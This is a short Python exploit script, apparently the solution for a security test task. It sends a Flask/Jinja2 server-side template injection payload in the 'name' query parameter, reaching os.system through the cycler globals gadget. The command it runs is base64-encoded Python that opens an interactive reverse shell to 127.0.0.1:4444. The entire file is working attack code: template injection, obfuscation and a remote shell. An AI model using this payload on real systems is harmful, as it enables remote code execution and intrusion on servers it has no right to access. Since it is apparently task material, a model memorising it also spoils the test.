#!/usr/bin/env python3
"""Launch a shell into the target task's RCE sidecar through Flask SSTI."""

import base64
import json
import os
import shlex
import urllib.parse
import urllib.request


def main() -> None:
    target_url = os.environ.get("REMOTE_TARGET_URL") or os.environ["LOCAL_TARGET_URL"]
    shell_code = (
        "import socket, subprocess;"
        "connection = socket.create_connection(('127.0.0.1', 4444));"
        "subprocess.call(['/bin/sh', '-i'], stdin=connection, "
        "stdout=connection, stderr=connection)"
    )
    encoded = base64.b64encode(shell_code.encode("utf-8")).decode("ascii")
    command = "python -c " + shlex.quote(
        "import base64; exec(base64.b64decode('" + encoded + "'))"
    )
    expression = (
        '{{cycler.__init__.__globals__["__builtins__"]["__import__"]'
        '("os").system(' + json.dumps(command) + ')}}'
    )
    url = target_url.rstrip("/") + "/?" + urllib.parse.urlencode({"name": expression})
    with urllib.request.urlopen(url, timeout=30) as response:
        body = response.read().decode("utf-8")
    if body != "Hello 0":
        raise RuntimeError("Shell command did not complete successfully")
    print(json.dumps({"evidence_payload": {}}))


if __name__ == "__main__":
    main()
